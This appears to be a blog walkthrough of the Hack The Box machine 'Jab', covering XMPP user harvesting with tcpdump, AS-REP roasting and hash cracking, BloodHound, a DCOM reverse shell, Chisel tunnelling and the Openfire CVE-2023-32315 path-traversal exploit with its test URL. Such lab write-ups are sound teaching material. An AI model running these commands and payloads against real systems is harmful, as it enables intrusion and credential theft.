---
title: HTB-Jab
draft: false
tags:
  - htb
  - windows
  - medium
  - xmpp
  - spark
  - tcpdump
  - getnpusers
  - as-rep-roasting
  - bloodhound
  - dcomexec
  - executedcom
  - chisel
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/Jab.png)

## Information Gathering
### Rustscan

Rustscan discovers many ports open. Based on the ports open, target seems to be Windows Domain Controller. 

`rustscan --addresses 10.10.11.4 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-43.png)


## Enumeration
### SMB - TCP 445

Since this is a DC machine, let's start with enumerating SMB:

`crackmapexec smb 10.10.11.4`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image.png)

Let's add **jab.htb** and **dc01.jab.htb** to `/etc/hosts`:
### DNS - TCP 53

Next, let's move on to enumerating DNS:

`dig axfr @10.10.11.4 jab.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-1.png)

Unfortunately zone transfer fails.
### HTTPs - TCP 7443

There's Openfire HTTP Binding Service running on port 7443:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-2.png)

**What is Openfire?**

**Openfire** is a real-time collaboration server that uses the **XMPP** protocol. It is written in Java and can support thousands of concurrent users. Openfire includes several key features, such as:

- User-friendly web-based administration panel
- Support for plugins
- SSL/TLS for security
- Integration with LDAP for user authentication

One of the features of Openfire is HTTP binding, which allows XMPP clients to connect to the server using HTTP or HTTPS, making it possible to use XMPP over web browsers. This is especially useful for web-based XMPP clients.

## XMPP - TCP 5222

In order to interact with **XMPP**, let's install [Spark](https://igniterealtime.org/downloads/#spark).

After starting Spark, go to **Advanced** and set the host as our target machine and set port as 5222:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-18.png)

Encryption mode should be disabled as well:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-5.png)

Now let's create a new account:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-3.png)

Using the new account, we can login to the XMPP server:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-7.png)

### XMPP Enumeration

Going to **Actions** -> **Join conference room**, we see two rooms: **test** and **test2**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-8.png)

**test** is encrypted and **test2** is accessible:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-9.png)

We see a message from **bdavis**, which seems to be encrpyted with base64:

`<img src="data:image/png;base64,VGhlIGltYWdlIGRhdGEgZ29lcyBoZXJlCg==" alt="some text" />`

We can decrypt it using **base64**, but nothing useful is seen:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-10.png)

Going to **Conferences**, new subdomain **conference.jab.htb** is discovered:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-11.png)

**Search** provides user search service:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-12.png)

Using this feature, we can obtain list of potential users on domain:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-13.png)

Using this usernames, we can perform AS-REP Roasting attack. However, it is not possible copy-paste or export this list of users. 

We would have to find a way around it.


### User List Retrieval

So our plan here is to listen on Spark's user search function and sort out list of usernames.

Let's first start a **tcpdump** listener on our HTB VPN network:

`sudo tcpdump -i tun0 -w output1.pcap`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-14.png)

Now let's sort out the username as such:

`sudo cat output1.pcap | grep -a -oP '(?<=<field var="Username"><value>)[^<]+'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-15.png)

We now have set of usernames ready for AS-REP Roasting attack. 

## AS-REP Roast

With the list of usernames, let's perform AS-REP Roasting:

`sudo GetNPUsers.py 'jab.htb/' -user user.list -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.11.4`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-16.png)

After waiting a while for the scan to complete, we can see that users **jmontgomery**, **lbradford**, and **mlowe** has **UF_DONT_REQUIRE_PREAUTH** set:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-4.png)

Now let's move on to cracking these hashes.
### Hash Crack

Let's use hashcat mode 18200 for cracking above hashes.

`hascat -m 18200 hashes rockyou.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/jab1.png)

Only hash for **jmontgomery** is cracked and the password is: **Midnight_121**

## Shell as svc_openfire
### XMPP as jmontgomery

Now that we have obtained credentials for **jmontgomery**, let's sign-in to XMPP as **jmontgomery** and see what it in there:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-6.png)

Looking at open chat rooms, we see one more interesting room: **2003 Third Party Pentest Discussion**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-19.png)

Let's take a look into it. 

It seems like **adunn** and **bdavis** is talking about misconfiguration they discovered during a pentest regarding **svc_openfire** account:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-20.png)

Scrolling down a little more, password hash for **svc_openfire** is found:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-21.png)

Even without the need for us to crack it, they provided cracked password in plain text:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-22.png)

Password for **svc_openfire** should be `!@#$%^&*(1qazxsw`.

### Bloodhound

Now let's enumerate the AD environment using Bloodhound and user **svc_openfire**'s credentials:

`sudo bloodhound-python -u 'svc_openfire' -p '!@#$%^&*(1qazxsw' -d jab.htb -dc DC01.jab.htb -c all -ns 10.10.11.4 --dns-timeout 30`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-23.png)

After spinning up **neo4j console** and **bloodhound**, we first mark **svc_openfire** as owned:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-24.png)

Poking around Bloodhound, we see that there's **ExecuteDCOM** right from **svc_openfire** to **DC01.jab.htb**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-25.png)

This will allow us to run commands on the Domain Controller:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-26.png)

Using this, we will be able to spawn reverse shell as the uer **svc_openfire**.

### ExecuteDCOM

Before exploiting **ExecuteDCOM**, let's first prepare reverse shell payload using [revshell](www.revshells.com):


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-27.png)

Now using **dcomexec.py**, we should be able to spawn a reverse shell on our netcat listener:

`dcomexec.py -object MMC20 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'reverse_shell_command' -silentcommand`

After running the command, we have reverse shell connection on our netcat listener as **svc_openfire**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-28.png)

It is now time for us to move on to privilege escalation.
## Privesc: svc_openfire to system

Let's first see if there's any interesting ports open internally:

`netstat -ano | findstr '127.0.0.1'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-29.png)

We can see that port **9090** and **9091** is open internally and we don't usually see this. 

Let's see if it is running a website on it:

`Invoke-WebRequest -Uri http://127.0.0.1:9090/ -UseBasicParsing`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-30.png)

It seems like port 9090 is running a website on it. 

Let's tunnel it to our local Kali machine to take a look at it. 

### Chisel

Let's move **Chisel** executable to the target machine.

First, we start smbserver:

`impacket-smbserver share -smb2support $(pwd)`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-31.png)

Now on the target machine, we can download chisel executable:

`copy \\10.10.14.29\share\chisel_windows.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-33.png)

Let's prepare Chisel server on our Kali machine and start Chisel client sessions from the target machine, tunneling both port **9090** and **9091**:

`.\chisel_windows.exe client 10.10.14.29:9999 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091`

We can see that tunneling session is made on Chisel server side:

`chisel server -p 9999 --reverse`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-32.png)

We should be able to access the website from our local browser now.

### CVE-2023-32315

Let's access the website by going to `http://127.0.0.1:9090` on web browser:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-34.png)

The website is running **Openfire 4.7.5** and we can login using the credentials for **svc_openfire**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-35.png)

Searching for the known exploit regarding the version, it seems like it is vulnerable to **CVE-2023-32315**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-36.png)

By visiting the address below, we can test if the corresponding Webapp is actually vulnerable:

`http://127.0.0.1:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-37.png)

Following [this tutorial](https://github.com/miko550/CVE-2023-32315), we should be able to get a shell as the system. 

Let's first move to **Plugins** tab:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-40.png)

At the bottom of the page, we can see that we can upload our own plugins.

Let's upload **Management Tool** plugin:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-41.png)

After successfully uploading, by going to **Server** >** server settings** > **Management tool**, we get execute commands as the system:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-42.png)


## References
- https://xmpp.org/software/?platform=linux
- https://igniterealtime.org/projects/spark/
- https://maggick.fr/2020/03/htb-forest.html
- https://learningsomecti.medium.com/path-traversal-to-rce-openfire-cve-2023-32315-6a8bf0285fcc
